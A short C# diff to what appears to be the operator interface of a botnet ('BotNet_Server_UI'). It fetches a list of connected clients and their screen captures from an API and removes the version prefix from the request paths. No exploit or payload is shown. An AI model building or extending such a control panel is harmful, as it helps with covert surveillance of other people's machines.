@@ -24,14 +24,14 @@ namespace BotNet_Server_UI
         {
             List<Button> buttons = new List<Button>();
         linkarrip:
-            Client[] arr = await ApiRequest.GetProductAsync<Client[]>($"/api/v{ApiRequest.ApiVersion}/client");
+            Client[] arr = await ApiRequest.GetProductAsync<Client[]>($"/api/client");
             if (arr == null)
             {
                 goto linkarrip;
             }
             for (int j = 0; j < arr.Length; j++)
             {
-                if (await ApiRequest.GetProductAsync<Screen>($"/api/v{ApiRequest.ApiVersion}/screens/" + arr[j].id) == default(Screen))
+                if (await ApiRequest.GetProductAsync<Screen>($"/api/screens/" + arr[j].id) == default(Screen))
                 {
                     continue;
                 }
@@ -54,7 +54,7 @@ namespace BotNet_Server_UI
         {
             var element = e.OriginalSource as FrameworkElement;
             var name = element?.Name;
-            var screen = await ApiRequest.GetProductAsync<Screen>($"/api/v{ApiRequest.ApiVersion}/screens/" + name.Remove(0, 1));
+            var screen = await ApiRequest.GetProductAsync<Screen>($"/api/screens/" + name.Remove(0, 1));
             nameofpc = ip.Find(x=>x.id == Convert.ToInt32(name.Remove(0,1))).nameofpc;
             ScreenBox screenBox = new ScreenBox(screen.screens, nameofpc)
             {
